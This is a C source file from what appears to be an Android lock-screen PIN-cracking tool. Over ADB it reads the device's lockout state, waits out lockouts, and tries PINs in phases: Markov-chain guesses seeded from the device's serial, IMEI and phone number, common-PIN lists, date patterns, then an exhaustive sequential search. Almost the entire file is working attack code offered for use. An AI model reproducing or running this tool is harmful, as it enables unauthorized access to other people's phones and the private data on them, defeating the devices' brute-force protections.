#define _GNU_SOURCE
#include "pincrack.h"
#include "adb.h"
#include "brute.h"
#include "pin_ai.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <ctype.h>
#include <pthread.h>

static volatile int pc_keep = 1;
static volatile int pc_found = 0;
static char pc_found_pin[32] = {0};
static pthread_mutex_t pc_mutex = PTHREAD_MUTEX_INITIALIZER;

static void pc_sigint(int sig) {
    (void)sig;
    pc_keep = 0;
}

static int pc_try(const char *pin) {
    adb_enter_pin(pin);
    return adb_is_unlocked();
}

static int pc_check_lockout(void) {
    char *tmp = adb_shell("adb shell dumpsys lock_settings 2>/dev/null | grep -iE 'failed|lockout|attempt'");
    trim_newline(tmp);
    if (strlen(tmp) == 0) {
        tmp = adb_shell("adb shell dumpsys locksettings 2>/dev/null | grep -iE 'failed|lockout|attempt'");
        trim_newline(tmp);
    }
    if (strlen(tmp) > 0) {
        printf(YELLOW "  [!] Lockout info: %s" RESET "\n", tmp);
        if (strstr(tmp, "lockout")) {
            int sec = 30;
            char *p = strstr(tmp, "lockout");
            char *q = strchr(p, '=');
            if (q) {
                q++;
                while (*q && *q == ' ') q++;
                if (isdigit(*q)) sec = atoi(q);
            }
            if (sec > 0 && sec < 3600) {
                printf(YELLOW "  [!] Device locked out. Waiting %ds..." RESET "\n", sec);
                for (int i = 0; i < sec && pc_keep; i++) {
                    printf("."); fflush(stdout);
                    sleep(1);
                }
                printf("\n");
                return 1;
            }
        }
    }
    return 0;
}

#define COMMON_4_COUNT 30
static const char *common_4[] = {
    "0000","1234","1111","2222","3333","4444","5555","6666","7777","8888",
    "9999","1212","4321","2000","2001","6969","1000","1122","1313","0001",
    "0007","1004","1337","2580","1590","1235","2468","1357","5683","0852"
};

#define COMMON_6_COUNT 20
static const char *common_6[] = {
    "000000","123456","111111","222222","333333","444444","555555","666666",
    "777777","888888","999999","123123","654321","112233","121212","789456",
    "159753","258000","000001","100200"
};

#define COMMON_8_COUNT 15
static const char *common_8[] = {
    "00000000","12345678","11111111","22222222","33333333","44444444",
    "55555555","66666666","77777777","88888888","99999999","12341234",
    "87654321","11223344","12121212"
};

static void gen_date_pins(const DeviceInfo *info, char pins[][16], int *count, int digits) {
    *count = 0;
    char fmt[8];
    snprintf(fmt, sizeof(fmt), "%%0%dd", digits);

    int years[] = {2020, 2021, 2022, 2023, 2024, 2025, 2026, 2019, 2018, 2017, 2016, 2015};
    for (int i = 0; i < 12 && *count < 50; i++) {
        int y = years[i] % (digits == 4 ? 10000 : 1000000);
        if (digits == 4) {
            snprintf(pins[*count], 16, fmt, y % 10000);
            (*count)++;
        }
    }

    for (int m = 1; m <= 12 && *count < 80; m++) {
        for (int d = 1; d <= 28 && *count < 80; d++) {
            if (digits == 4) {
                int val = m * 100 + d;
                snprintf(pins[*count], 16, fmt, val);
                (*count)++;
            }
        }
    }

    if (strlen(info->serial) >= (size_t)digits) {
        snprintf(pins[*count], 16, "%.*s", digits, info->serial);
        (*count)++;
    }
    if (strlen(info->vendor) >= (size_t)digits) {
        snprintf(pins[*count], 16, "%.*s", digits, info->vendor);
        (*count)++;
    }
}

typedef struct {
    const char **pins;
    long count;
    int delay_ms;
} PhaseArg;

static int run_phase(const char **pins, long count, int delay_ms,
                     const char *label, long *pstart) {
    if (!pc_keep || pc_found) return 0;
    printf("\n  [" CYAN "*" RESET "] Phase: %s (%ld PINs)\n", label, count);

    double t0 = (double)clock() / CLOCKS_PER_SEC;
    for (long i = 0; i < count && pc_keep && !pc_found; i++) {
        const char *pin = pins[i];
        if (pc_check_lockout() > 0) i--;
        if (pc_try(pin)) {
            pthread_mutex_lock(&pc_mutex);
            if (!pc_found) {
                pc_found = 1;
                strncpy(pc_found_pin, pin, sizeof(pc_found_pin)-1);
            }
            pthread_mutex_unlock(&pc_mutex);
            double elapsed = (double)clock() / CLOCKS_PER_SEC - t0;
            printf("\n" GREEN "[!!!] PIN FOUND: %s" RESET " (%.0fs)\n", pin, elapsed);
            return 1;
        }
        if (delay_ms > 0) usleep(delay_ms * 1000);
        double elapsed = (double)clock() / CLOCKS_PER_SEC - t0;
        print_progress(i, count, pin, elapsed);
    }
    return 0;
}

int brute_smart(DeviceInfo *info, int digits, int delay_ms) {
    char pin_buf[32];
    long total = 1;
    for (int i = 0; i < digits; i++) total *= 10;

    printf("\n" BOLD "[*] Smart brute: %d-digit" RESET " | Delay: %dms\n", digits, delay_ms);
    printf("  [" CYAN "*" RESET "] Phase 0: AI Markov-chain predictions\n");
    printf("  [" CYAN "*" RESET "] Phase 1: Common PINs\n");
    printf("  [" CYAN "*" RESET "] Phase 2: Date patterns\n");
    printf("  [" CYAN "*" RESET "] Phase 3: Sequential brute (%ld PINs)\n", total);

    if (!yes_no("\n[*] Launch smart attack? [y/n]: ")) return 0;
    printf("\n");

    signal(SIGINT, pc_sigint);

    /* Phase 0: AI Markov-chain predictions */
    if (pc_keep && !pc_found) {
        pin_ai_init(info->serial, info->imei1, info->imei2,
                    info->phone_number, info->build_fingerprint,
                    info->model, 0, 0);
        pin_ai_set_length(digits);
        long ai_total = pin_ai_count();
        int ai_used = 0;
        printf("  [" CYAN "*" RESET "] Phase 0: AI (%ld predictions)\n", ai_total);
        char ai_pin[16];
        while (pin_ai_next(ai_pin, 15) && ai_used < 256 && pc_keep && !pc_found) {
            if (pc_try(ai_pin)) {
                pc_found = 1;
                strncpy(pc_found_pin, ai_pin, sizeof(pc_found_pin)-1);
                break;
            }
            if (delay_ms > 0) usleep(delay_ms * 1000);
            printf("\r  [AI] %d/%ld %s  ", ai_used+1, ai_total, ai_pin);
            fflush(stdout);
            ai_used++;
        }
        printf("\n");
    }

    char date_pins[128][16];
    int date_count = 0;
    gen_date_pins(info, date_pins, &date_count, digits);

    const char **common = NULL;
    int common_count = 0;
    if (digits == 4) { common = common_4; common_count = COMMON_4_COUNT; }
    else if (digits == 6) { common = common_6; common_count = COMMON_6_COUNT; }
    else if (digits == 8) { common = common_8; common_count = COMMON_8_COUNT; }

    if (common && run_phase(common, common_count, delay_ms, "Common PINs", NULL)) return 1;

    const char **dp = malloc(date_count * sizeof(char*));
    for (int i = 0; i < date_count; i++) dp[i] = date_pins[i];
    if (date_count > 0) {
        if (run_phase(dp, date_count, delay_ms, "Date patterns", NULL)) {
            free(dp); return 1;
        }
    }
    free(dp);

    if (pc_found) return 1;

    printf("\n  [" CYAN "*" RESET "] Phase 3: Sequential %d-%d\n", 0, (int)total-1);

    signal(SIGINT, pc_sigint);
    double t0 = (double)clock() / CLOCKS_PER_SEC;

    for (long i = 0; i < total && pc_keep && !pc_found; i++) {
        snprintf(pin_buf, sizeof(pin_buf), "%0*ld", digits, i);
        if (pc_check_lockout() > 0) i--;
        if (pc_try(pin_buf)) {
            pc_found = 1;
            strncpy(pc_found_pin, pin_buf, sizeof(pc_found_pin)-1);
            break;
        }
        if (delay_ms > 0) usleep(delay_ms * 1000);
        double elapsed = (double)clock() / CLOCKS_PER_SEC - t0;
        print_progress(i, total, pin_buf, elapsed);
    }
    printf("\n");

    if (pc_found) {
        printf("\n" GREEN "[!!!] PIN FOUND: %s" RESET "\n", pc_found_pin);
        return 1;
    }
    printf(YELLOW "[-] PIN not found." RESET "\n");
    return 0;
}

int brute_pattern(DeviceInfo *info, int delay_ms) {
    (void)info;
    printf("\n" YELLOW "[!] Pattern unlock not yet supported via ADB." RESET "\n");
    printf("  [*] Patterns require swipe gestures, not keyevents.\n");
    printf("  [*] Use a tool like 'adbextractor' for pattern brute.\n");
    return 0;
}

int check_lockout(DeviceInfo *info) {
    return pc_check_lockout();
}
